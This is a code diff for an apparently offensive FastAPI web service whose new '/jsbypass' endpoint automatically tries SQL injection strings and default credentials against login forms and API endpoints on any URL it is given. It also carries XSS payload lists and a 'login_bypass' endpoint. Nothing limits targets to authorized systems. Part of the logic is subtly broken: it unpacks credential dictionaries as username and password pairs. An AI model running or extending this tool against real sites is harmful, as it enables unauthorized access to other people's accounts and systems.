@@ -919,7 +919,7 @@ def full_audit(domain: str, key: str = Depends(verify_key)):
 
     # 3. Real XSS Test
     try:
-    xss_payloads = ["<script>alert(1)</script>", '">img src=x onerror=alert(1)>', "javascript:alert(1)"]
+        xss_payloads = ["<script>alert(1)</script>", '">img src=x onerror=alert(1)>', "javascript:alert(1)"]
         xss_results = []
         for payload in xss_payloads:
             try:
@@ -1487,6 +1487,7 @@ def login_bypass(url: str, key: str = Depends(verify_key)):
             success = any(s in body for s in success_indicators)
             fail = any(f in body for f in fail_indicators)
             if success and not fail:
+                    results.append({"type": "SQL Injection", "payload": payload, "status": "Success"})
             else:
                 results.append({"type": "SQL Injection", "payload": payload, "status": "Failed"})
 
@@ -1508,6 +1509,7 @@ def login_bypass(url: str, key: str = Depends(verify_key)):
             success = any(s in body for s in success_indicators)
             fail = any(f in body for f in fail_indicators)
             if success and not fail:
+                    results.append({"type": "Default Creds", "username": username, "password": password, "status": "Success"})
             else:
                 results.append({"type": "Default Creds", "username": username, "password": password, "status": "Failed"})
 
@@ -1522,3 +1524,196 @@ def login_bypass(url: str, key: str = Depends(verify_key)):
     except Exception as e:
         return {"status": "error", "error": str(e), "response_time": f"{round(time.time() - start, 2)}s"}
 
+@app.get("/jsbypass")
+def js_bypass(url: str, key: str = Depends(verify_key)):
+    import time
+    import requests
+    from urllib.parse import urljoin, urlparse
+    from bs4 import BeautifulSoup
+
+    start = time.time()
+    results = {"target": url, "bypassed": [], "bypassed_count": 0, "method": None}
+
+    session = requests.Session()
+    session.headers.update({"User-Agent": "Mozilla/5.0"})
+
+    # Common login paths
+    login_paths = ["/login", "/signin", "/login.php", "/signin.php",
+                   "/user/login", "/account/login", "/auth/login"]
+
+    # API endpoints
+    api_endpoints = [
+        "/api/login", "/api/auth", "/api/v1/login", "/api/user/login",
+        "/rest/user/login", "/auth/login", "/user/login", "/login.json",
+        "/api/authenticate", "/api/session", "/auth/local", "/api/account/login"
+    ]
+
+    # Payloads
+    json_payloads = [
+        {"username": "' OR '1'='1", "password": "' OR '1'='1"},
+        {"email": "' OR '1'='1", "password": "' OR '1'='1"},
+        {"username": "admin'--", "password": "anything"},
+        {"email": "admin'--", "password": "anything"},
+        {"username": "' OR 1=1--", "password": "anything"},
+        {"email": "' OR 1=1--", "password": "anything"},
+        {"username": "admin", "password": "admin"},
+        {"email": "admin", "password": "admin"},
+        {"username": "admin", "password": "password"},
+        {"email": "admin", "password": "password"},
+        {"username": "admin", "password": "123456"},
+        {"email": "admin", "password": "123456"},
+        {"username": "root", "password": "root"},
+        {"username": "test", "password": "test"},
+    ]
+
+    form_payloads = [
+        {"username": "' OR '1'='1", "password": "' OR '1'='1"},
+        {"email": "' OR '1'='1", "password": "' OR '1'='1"},
+        {"username": "admin'--", "password": "anything"},
+        {"email": "admin'--", "password": "anything"},
+        {"username": "admin", "password": "admin"},
+        {"email": "admin", "password": "admin"},
+    ]
+
+    def try_login_form(form_url, data):
+        try:
+            r = session.post(form_url, data=data, timeout=5, allow_redirects=True)
+            body = r.text.lower()
+            return any(s in body for s in ["welcome", "dashboard", "logout", "profile", "success"])
+        except:
+            return False
+
+    def try_json_endpoint(endpoint, payload):
+        try:
+            r = session.post(endpoint, json=payload, timeout=5)
+            if r.status_code in [200, 302]:
+                try:
+                    resp_json = r.json()
+                    if "token" in resp_json or "success" in resp_json or "user" in resp_json:
+                        return True
+                except:
+                    if "welcome" in r.text.lower() or "dashboard" in r.text.lower():
+                        return True
+        except:
+            pass
+        return False
+
+    # Step 1: Given URL directly
+    try:
+        res = session.get(url, timeout=10)
+        soup = BeautifulSoup(res.text, "html.parser")
+        forms = soup.find_all("form")
+        if forms:
+            for form in forms:
+                action = form.get("action", url)
+                if not action.startswith("http"):
+                    action = urljoin(url, action)
+                inputs = form.find_all("input")
+                data = {}
+                for inp in inputs:
+                    name = inp.get("name")
+                    if name:
+                        data[name] = inp.get("value", "")
+                user_field = next((k for k in data if any(x in k.lower() for x in ["user", "email", "login"])), None)
+                pass_field = next((k for k in data if any(x in k.lower() for x in ["pass", "pwd", "password"])), None)
+                if user_field and pass_field:
+                    for username, password in json_payloads[:10]:
+                        test_data = data.copy()
+                        test_data[user_field] = username
+                        test_data[pass_field] = password
+                        if try_login_form(action, test_data):
+                            results["bypassed"].append({"username": username, "password": password, "method": "html_form"})
+                            results["bypassed_count"] = 1
+                            results["method"] = "html_form"
+                            break
+                    if results["bypassed"]:
+                        break
+    except:
+        pass
+
+    # Step 2: Try common login paths
+    if not results["bypassed"]:
+        parsed = urlparse(url)
+        base = f"{parsed.scheme}://{parsed.netloc}"
+        for path in login_paths:
+            test_url = urljoin(base, path)
+            try:
+                res = session.get(test_url, timeout=10)
+                soup = BeautifulSoup(res.text, "html.parser")
+                forms = soup.find_all("form")
+                if not forms:
+                    continue
+                for form in forms:
+                    action = form.get("action", test_url)
+                    if not action.startswith("http"):
+                        action = urljoin(test_url, action)
+                    inputs = form.find_all("input")
+                    data = {}
+                    for inp in inputs:
+                        name = inp.get("name")
+                        if name:
+                            data[name] = inp.get("value", "")
+                    user_field = next((k for k in data if any(x in k.lower() for x in ["user", "email", "login"])), None)
+                    pass_field = next((k for k in data if any(x in k.lower() for x in ["pass", "pwd", "password"])), None)
+                    if user_field and pass_field:
+                        for username, password in json_payloads[:10]:
+                            test_data = data.copy()
+                            test_data[user_field] = username
+                            test_data[pass_field] = password
+                            if try_login_form(action, test_data):
+                                results["bypassed"].append({"username": username, "password": password, "method": f"html_form_{path}"})
+                                results["bypassed_count"] = 1
+                                results["method"] = f"html_form_{path}"
+                                break
+                        if results["bypassed"]:
+                            break
+            except:
+                continue
+
+    # Step 3: API endpoints
+    if not results["bypassed"]:
+        parsed = urlparse(url)
+        base = f"{parsed.scheme}://{parsed.netloc}"
+        for endpoint in api_endpoints:
+            api_url = urljoin(base, endpoint)
+            for payload in json_payloads:
+                if try_json_endpoint(api_url, payload):
+                    results["bypassed"].append({"payload": payload, "method": f"json_{endpoint}"})
+                    results["bypassed_count"] = 1
+                    results["method"] = "json_api"
+                    break
+            if results["bypassed"]:
+                break
+            for payload in form_payloads:
+                try:
+                    r = session.post(api_url, data=payload, timeout=5)
+                    if r.status_code in [200, 302] and ("welcome" in r.text.lower() or "dashboard" in r.text.lower()):
+                        results["bypassed"].append({"payload": payload, "method": f"form_{endpoint}"})
+                        results["bypassed_count"] = 1
+                        results["method"] = "form_api"
+                        break
+                except:
+                    pass
+            if results["bypassed"]:
+                break
+
+    # Step 4: GET injection on API endpoints
+    if not results["bypassed"]:
+        for endpoint in ["/api/users", "/api/admin", "/api/keys"]:
+            test_url = urljoin(base, endpoint)
+            for param in ["username", "email", "id"]:
+                payload = f"?{param}=' OR '1'='1"
+                try:
+                    r = session.get(test_url + payload, timeout=5)
+                    if r.status_code == 200 and ("sql" in r.text.lower() or "error" in r.text.lower()):
+                        results["bypassed"].append({"method": f"get_injection_{endpoint}"})
+                        results["bypassed_count"] = 1
+                        results["method"] = "get_injection"
+                        break
+                except:
+                    pass
+            if results["bypassed"]:
+                break
+
+    results["response_time"] = f"{round(time.time()-start, 2)}s"
+    return results
